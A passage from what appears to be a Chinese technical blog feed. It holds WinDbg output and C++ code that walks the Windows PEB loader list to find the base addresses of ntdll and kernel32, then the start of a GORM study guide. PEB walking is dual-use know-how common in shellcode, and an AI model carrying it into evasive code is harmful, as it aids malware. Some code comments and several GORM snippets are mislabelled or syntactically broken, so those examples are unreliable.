class="number">0x00000275</span>`<span class="number">005e42</span>c0  <span class="string">&quot;C:\\WINDOWS\\SYSTEM32\\ntdll.dll&quot;</span></span><br><span class="line">   +<span class="number">0x058</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;ntdll.dll&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x12</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x14</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span class="number">0x00007ffc</span>`<span class="number">2994e5</span>d0  <span class="string">&quot;ntdll.dll&quot;</span></span><br><span class="line">   +<span class="number">0x068</span> FlagGroup        : [<span class="number">4</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line"></span><br><span class="line">略...</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt -r1 <span class="number">0x00000275</span>`<span class="number">005e4</span>d10<span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5440</span> - <span class="number">0x00000275</span>`<span class="number">005e4430</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e5440</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5080</span> - <span class="number">0x00000275</span>`<span class="number">005e4</span>d00 ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e4430</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d00 - <span class="number">0x00000275</span>`<span class="number">005e4620</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5450</span> - <span class="number">0x00000275</span>`<span class="number">005e4440</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e5450</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5090</span> - <span class="number">0x00000275</span>`<span class="number">005e4</span>d10 ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e4440</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d10 - <span class="number">0x00000275</span>`<span class="number">005e4630</span> ]</span><br><span class="line">   +<span class="number">0x020</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x00007ffc</span>`<span class="number">29996470</span> - <span class="number">0x00000275</span>`<span class="number">005e5460</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00007ffc</span>`<span class="number">29996470</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4450</span> - <span class="number">0x00000275</span>`<span class="number">005e4</span>d20 ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e5460</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d20 - <span class="number">0x00000275</span>`<span class="number">005e4450</span> ]</span><br><span class="line">   +<span class="number">0x030</span> DllBase          : <span class="number">0x00007ffc</span>`<span class="number">286f</span>0000 Void           <span class="comment">// &lt;=== 指向KERNEL32.dll基址</span></span><br><span class="line">   +<span class="number">0x038</span> EntryPoint       : <span class="number">0x00007ffc</span>`<span class="number">287025e0</span> Void</span><br><span class="line">   +<span class="number">0x040</span> SizeOfImage      : <span class="number">0xc4000</span></span><br><span class="line">   +<span class="number">0x048</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;C:\\WINDOWS\\System32\\KERNEL32.DLL&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x40</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x42</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span class="number">0x00000275</span>`<span class="number">005e4</span>ef0  <span class="string">&quot;C:\\WINDOWS\\System32\\KERNEL32.DLL&quot;</span></span><br><span class="line">   +<span class="number">0x058</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;KERNEL32.DLL&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x18</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x1a</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span class="number">0x00000275</span>`<span class="number">005e4</span>f18  <span class="string">&quot;KERNEL32.DLL&quot;</span></span><br><span class="line">   +<span class="number">0x068</span> FlagGroup        : [<span class="number">4</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line"></span><br><span class="line">略...</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt -r1 <span class="number">0x00000275</span>`<span class="number">005e5450</span><span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5080</span> - <span class="number">0x00000275</span>`<span class="number">005e4</span>d00 ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e5080</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e8270</span> - <span class="number">0x00000275</span>`<span class="number">005e5440</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e4</span>d00 _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5440</span> - <span class="number">0x00000275</span>`<span class="number">005e4430</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5090</span> - <span class="number">0x00000275</span>`<span class="number">005e4</span>d10 ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e5090</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e8280</span> - <span class="number">0x00000275</span>`<span class="number">005e5450</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e4</span>d10 _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5450</span> - <span class="number">0x00000275</span>`<span class="number">005e4440</span> ]</span><br><span class="line">   +<span class="number">0x020</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e4</span>d20 - <span class="number">0x00000275</span>`<span class="number">005e4450</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x00000275</span>`<span class="number">005e4</span>d20 _LIST_ENTRY [ <span class="number">0x00007ffc</span>`<span class="number">29996470</span> - <span class="number">0x00000275</span>`<span class="number">005e5460</span> ]</span><br><span class="line">      +<span class="number">0x008</span> Blink            : <span class="number">0x00000275</span>`<span class="number">005e4450</span> _LIST_ENTRY [ <span class="number">0x00000275</span>`<span class="number">005e5460</span> - <span class="number">0x00007ffc</span>`<span class="number">29996470</span> ]</span><br><span class="line">   +<span class="number">0x030</span> DllBase          : <span class="number">0x00007ffc</span>`<span class="number">270e0000</span> Void       <span class="comment">// &lt;=== 指向KERNELBASE.dll基址</span></span><br><span class="line">   +<span class="number">0x038</span> EntryPoint       : <span class="number">0x00007ffc</span>`<span class="number">27121850</span> Void</span><br><span class="line">   +<span class="number">0x040</span> SizeOfImage      : <span class="number">0x3ac000</span></span><br><span class="line">   +<span class="number">0x048</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;C:\\WINDOWS\\System32\\KERNELBASE.dll&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x44</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x46</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span class="number">0x00000275</span>`<span class="number">005e5630</span>  <span class="string">&quot;C:\\WINDOWS\\System32\\KERNELBASE.dll&quot;</span></span><br><span class="line">   +<span class="number">0x058</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;KERNELBASE.dll&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x1c</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x1e</span></span><br><span class="line">      +<span class="number">0x008</span> Buffer           : <span class="number">0x00000275</span>`<span class="number">005e5658</span>  <span class="string">&quot;KERNELBASE.dll&quot;</span></span><br><span class="line">   +<span class="number">0x068</span> FlagGroup        : [<span class="number">4</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line"></span><br><span class="line">略...</span><br></pre></td></tr></table></figure><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 PEB 地址</span></span><br><span class="line">    PVOID pPeb = <span class="built_in">reinterpret_cast</span>&lt;PVOID&gt;(__readgsqword(<span class="number">0x60</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pPeb) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to get PEB address.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 Ldr 地址的偏移量</span></span><br><span class="line">    ULONG64 ldrOffset = <span class="number">0x18</span>; <span class="comment">// PEB 结构中 Ldr 成员的偏移量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 Ldr 地址</span></span><br><span class="line">    PVOID pLdr = *<span class="built_in">reinterpret_cast</span>&lt;PVOID*&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pPeb) + ldrOffset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pLdr) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to get Ldr address.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 InLoadOrderModuleList 地址的偏移量</span></span><br><span class="line">    ULONG64 moduleListOffset = <span class="built_in">offsetof</span>(PEB_LDR_DATA, InMemoryOrderModuleList);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 InLoadOrderModuleList 地址</span></span><br><span class="line">    PLIST_ENTRY pModuleList = <span class="built_in">reinterpret_cast</span>&lt;PLIST_ENTRY&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pLdr) + moduleListOffset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取第一个模块的地址，通常是 ntdll.dll</span></span><br><span class="line">    PLIST_ENTRY pFirstEntry = pModuleList-&gt;Flink;</span><br><span class="line">    PLDR_DATA_TABLE_ENTRY pDataTableEntry = <span class="built_in">CONTAINING_RECORD</span>(pFirstEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    PVOID pModExeBase = pDataTableEntry-&gt;DllBase;</span><br><span class="line">    UNICODE_STRING pModExeName = pDataTableEntry-&gt;FullDllName;</span><br><span class="line">    <span class="comment">// 将 UNICODE_STRING 转换为 std::wstring</span></span><br><span class="line">    <span class="function">std::wstring <span class="title">ModExeModuleNameW</span><span class="params">(pModExeName.Buffer, pModExeName.Length / <span class="keyword">sizeof</span>(WCHAR))</span></span>;</span><br><span class="line">    <span class="comment">// 输出模块信息</span></span><br><span class="line">    std::wcout &lt;&lt; <span class="string">L&quot;Module: &quot;</span> &lt;&lt; ModExeModuleNameW &lt;&lt; <span class="string">L&quot;, Base Address: &quot;</span> &lt;&lt; pModExeBase &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    PLDR_DATA_TABLE_ENTRY pKernel32Entry = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算第二个模块的地址，通常是 ntdll.dll</span></span><br><span class="line">    PLIST_ENTRY pSecondEntry = pFirstEntry-&gt;Flink;</span><br><span class="line">    PLDR_DATA_TABLE_ENTRY pSecondDataTableEntry = <span class="built_in">CONTAINING_RECORD</span>(pSecondEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    PVOID pNtDllBase = pSecondDataTableEntry-&gt;DllBase;</span><br><span class="line">    UNICODE_STRING NtDllName = pSecondDataTableEntry-&gt;FullDllName;</span><br><span class="line">    <span class="comment">// 将 UNICODE_STRING 转换为 std::wstring</span></span><br><span class="line">    <span class="function">std::wstring <span class="title">NtDllModuleNameW</span><span class="params">(NtDllName.Buffer, NtDllName.Length / <span class="keyword">sizeof</span>(WCHAR))</span></span>;</span><br><span class="line">    <span class="comment">// 输出模块信息</span></span><br><span class="line">    std::wcout &lt;&lt; <span class="string">L&quot;Module: &quot;</span> &lt;&lt; NtDllModuleNameW &lt;&lt; <span class="string">L&quot;, Base Address: &quot;</span> &lt;&lt; pNtDllBase &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算第三个模块的地址，通常是 KERNEL32.dll</span></span><br><span class="line">    PLIST_ENTRY pThirdEntry = pSecondEntry-&gt;Flink;</span><br><span class="line">    PLDR_DATA_TABLE_ENTRY pThirdDataTableEntry = <span class="built_in">CONTAINING_RECORD</span>(pThirdEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    PVOID pKernel32Base = pThirdDataTableEntry-&gt;DllBase;</span><br><span class="line">    UNICODE_STRING Kernel32Name = pThirdDataTableEntry-&gt;FullDllName;</span><br><span class="line">    <span class="comment">// 将 UNICODE_STRING 转换为 std::wstring</span></span><br><span class="line">    <span class="function">std::wstring <span class="title">Kernel32ModuleNameW</span><span class="params">(Kernel32Name.Buffer, Kernel32Name.Length / <span class="keyword">sizeof</span>(WCHAR))</span></span>;</span><br><span class="line">    <span class="comment">// 输出模块信息</span></span><br><span class="line">    std::wcout &lt;&lt; <span class="string">L&quot;Module: &quot;</span> &lt;&lt; Kernel32ModuleNameW &lt;&lt; <span class="string">L&quot;, Base Address: &quot;</span> &lt;&lt; pKernel32Base &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gorm学习手册</title>
      <link href="/ac48c083.html"/>
      <url>/ac48c083.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>记录Gorm学习手册</p></div><span id="more"></span><h2 id="声明模型"><a href="#声明模型" class="headerlink" title="声明模型"></a>声明模型</h2><p><strong>模型定义</strong></p><blockquote><p>GORM通过将Go结构体(Go Structs)映射到数据库表来简化数据库交互</p></blockquote><h3 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h3><p>模型是使用普通结构体定义的。这些结构体可以包含具有基本Go类型、指针或这些类型的别名, 甚至是自定义类型(只需要实现<code>database/sql</code>包中的Scanner和Valuer接口)。</p><p>考虑以下<code>user</code>模型示例:</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">    ID              <span class="type">uint</span>            <span class="comment">// 主键</span></span><br><span class="line">    Name            <span class="type">string</span>          <span class="comment">// 一个常规字符串字段</span></span><br><span class="line">    Email           *<span class="type">string</span>         <span class="comment">// 一个指向字符串的指针, 允许空值</span></span><br><span class="line">    Age             <span class="type">uint8</span>           <span class="comment">// 一个未签名的8位整数</span></span><br><span class="line">    Brithday        *time.Time      <span class="comment">// time.Time指针, 可以为空</span></span><br><span class="line">    MemberNumber    sql.NullString  <span class="comment">// 使用 sql.NullString 处理可为空字符串</span></span><br><span class="line">    ActivatedAt     sql.NullTime    <span class="comment">// Uses sql.NullTime for nullable time fields</span></span><br><span class="line">    CreatedAt       time.Time       <span class="comment">// 创建时间（由GORM自动管理）</span></span><br><span class="line">    UpdatedAt       time.Time       <span class="comment">// 最后一次更新时间（由GORM自动管理）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此模型中:</p><ul><li>具体数字型如<code>uint</code>、<code>string</code>和<code>uint8</code>直接使用;</li><li>指向<code>*string</code>和<code>*time.Time</code>类型的指针表示可空字段;</li><li>来自<code>database/sql</code>包的<code>sql.NullString</code>和<code>sql.NullTime</code>用于具有更多控制的可空字段;</li><li><code>CreateAt</code>和<code>UpdateAt</code>是特殊字段, 当记录被创建或更新时, GORM会自动向内填充当前时间;</li></ul><p>除了GORM中模型声明的基本特性外, 强调下通过serializer标签支持序列化也很重要; 此功能增强了数据存储和检索的灵活性, 特别是需要自定义序列化逻辑的字段;</p><h4 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h4><ol><li><strong>主键</strong>: GORM使用一个名为<code>ID</code>的字段作为每个模型的默认主键;</li><li><strong>表名</strong>: 默认情况下, GORM将结构体名称转化为<code>snake_case</code>并为表名加上复数形式; 例如, 一个<code>User</code>结构体在数据库中表名变成<code>users</code>;</li><li><strong>列名</strong>: GORM自动将结构体字段名转换为<code>snake_case</code>作为数据库中列名;</li><li><strong>时间戳字段</strong>: GORM使用字段<code>CreatedAt</code>和<code>UpdatedAt</code>来自动跟踪记录的创建和更新时间;</li></ol><h4 id="gorm-Model"><a href="#gorm-Model" class="headerlink" title="gorm.Model"></a>gorm.Model</h4><p>GORM提供了一个预定义的结构体, 名为<code>gorm.Model</code>, 其中包含常用字段:</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gorm.Model 的定义</span></span><br><span class="line"><span class="keyword">type</span> Model <span class="keyword">struct</span> &#123;</span><br><span class="line">    ID          <span class="type">uint</span>            <span class="string">`gorm:&quot;primaryKey&quot;`</span></span><br><span class="line">    CreatedAt   time.Time   </span><br><span class="line">    UpdatedAt   time.Time</span><br><span class="line">    DeletedAt   gorm.DeletedAt  <span class="string">`gorm:&quot;index&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>将其嵌入在结构体中</strong>: 可以直接在结构体中嵌入<code>gorm.Model</code>, 以便自动包含这些字段;</li><li><strong>包含的字段</strong>:<ul><li><code>ID</code>: 每个记录的唯一标识符(主键);</li><li><code>CreatedAt</code>: 在创建时自动设置为当前时间;</li><li><code>UpdatedAt</code>: 每当记录更新时, 自动更新为当前时间;</li><li><code>DeletedAt</code>: 用于软删除;</li></ul></li></ul><h2 id="CRUD接口"><a href="#CRUD接口" class="headerlink" title="CRUD接口"></a>CRUD接口</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><h4 id="创建记录"><a href="#创建记录" class="headerlink" title="创建记录"></a>创建记录</h4><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user := User&#123;Name: <span class="string">&quot;Jinzhu&quot;</span>, Age: <span class="number">18</span>, Birthday: time.Now()&#125;</span><br><span class="line"></span><br><span class="line">result := db.Create(&amp;user) <span class="comment">// 通过数据的指针来创建</span></span><br><span class="line"></span><br><span class="line">user.ID             <span class="comment">// 返回插入数据的主键</span></span><br><span class="line">result.Error        <span class="comment">// 返回error</span></span><br><span class="line">result.RowsAffected <span class="comment">// 返回插入记录的条数</span></span><br></pre></td></tr></table></figure><p>我们还可以使用<code>Create()</code>创建多项记录:</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">users := []*User&#123;</span><br><span class="line">    &#123;Name: <span class="string">&quot;Jinzhu&quot;</span>, Age: <span class="number">18</span>, Birthday: time.Now()&#125;,</span><br><span class="line">    &#123;Name: <span class="string">&quot;Jackson&quot;</span>, Age: <span class="number">19</span>, Birthday: time.Now()&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result := db.Create(&amp;users)</span><br><span class="line"></span><br><span class="line">result.Error        <span class="comment">// 返回错误</span></span><br><span class="line">result.RowsAffected <span class="comment">// 返回插入记录的条数</span></span><br></pre></td></tr></table></figure><div class="note bug"><p><strong></strong></p><p>无法向<code>create</code>传递结构体, 所以应该传入数据的指针</p></div><h4 id="用指定的字段创建记录"><a href="#用指定的字段创建记录" class="headerlink" title="用指定的字段创建记录"></a>用指定的字段创建记录</h4><p>创建记录并为指定字段赋值</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.Select(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;Age&quot;</span>, <span class="string">&quot;CreateAt&quot;</span>).Create(&amp;user)</span><br><span class="line"><span class="comment">// INSERT INTO `users` (`name`, `age`, `create_at`) VALUES (&quot;Jinzhu&quot;, 18, &quot;2024-07-04 11:05:21.775&quot;)</span></span><br></pre></td></tr></table></figure><p>创建记录并忽略传递给<code>Omit</code>的字段值</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.Omit(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;Age&quot;</span>, <span class="string">&quot;CreateAt&quot;</span>).Create(&amp;user)</span><br><span class="line"><span class="comment">// INSERT INTO `users` (`birthday`, `updated_at`) VALUES (&quot;2024-01-01 00:00:00.000&quot;, &quot;2024-07-04 11:05:21.775&quot;)</span></span><br></pre></td></tr></table></figure><h4 id="批量插入"><a href="#批量插入" class="headerlink" title="批量插入"></a>批量插入</h4><p>要高效地插入大量记录, 请将切片传递给<code>Create</code>方法。GORM将生成一条SQL来插入所有数据, 以返回所有主键值, 并触发<code>Hook</code>方法, 当这些记录可以被分割成多个批次时, GORM会开启一个事务来处理它们。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> users = []User&#123;</span><br><span class="line">    &#123;Name: <span class="string">&quot;jinzhu1&quot;</span>&#125;, </span><br><span class="line">    &#123;Name: <span class="string">&quot;jinzhu2&quot;</span>&#125;,</span><br><span class="line">    &#123;Name: <span class="string">&quot;jinzhu3&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">db.Create(&amp;users)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> users &#123;</span><br><span class="line">    user.ID     <span class="comment">// 1,2,3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过<code>db.CreateInBatches</code>方法来指定批量插入的批次大小</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> users []User&#123;</span><br><span class="line">    &#123;Name: <span class="string">&quot;jinzhi1&quot;</span>&#125;,</span><br><span class="line">    ...</span><br><span class="line">    &#123;Name&#125;: <span class="string">&quot;jinzhi1000&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入批次大小为100</span></span><br><span class="line">db.CreateInBatches(&amp;users, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><div class="note bug"><p><strong></strong></p><p><strong>注意:</strong> 使用<code>CreateBatchSize</code>选项初始化GORM实例后, 此后进行创建&amp;关联操作时所有的<code>INSERT</code>行为都会遵循初始化的配置。</p></div><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">db, err := gorm.Open(sqlite.Open(<span class="string">&quot;gorm.db&quot;</span>), &amp;gorm.Config&#123;</span><br><span class="line">    CreateBatchSize: <span class="number">1000</span>,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;...&#125;</span><br><span class="line"></span><br><span class="line">db := db.Session(&amp;gorm.Session&#123;CreateBatchSize: <span class="number">1000</span>&#125;)</span><br><span class="line"></span><br><span class="line">users := [<span class="number">5000</span>]User&#123;&#123;Name: <span class="string">&quot;jinzhu&quot;</span>, Pets: []Pet&#123;pet1, pet2, pet3&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">db.Create(&amp;users)</span><br><span class="line"><span class="comment">// INSERT INTO users xxx (5 batches)</span></span><br><span class="line"><span class="comment">// INSERT INTO pets xxx (15 batches)</span></span><br></pre></td></tr></table></figure><h4 id="创建钩子"><a href="#创建钩子" class="headerlink" title="创建钩子"></a>创建钩子</h4><p>GORM允许用户通过实现这些接口<code>BeforeSave</code>、<code>BeforeCreate</code>、<code>AfterSave</code>、<code>AfterCreate</code>来自定义钩子。这些钩子方法会在创建一条记录时被调用;</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> BeforeCreate (tx *gorm.DB) (err <span class="type">error</span>) &#123;</span><br><span class="line">    u.UUID = uuid.New()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.Role == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">&quot;invalid code&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想跳过<code>Hooks</code>方法, 可以使用<code>SkipHooks</code>会话模式, 例子如下:</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 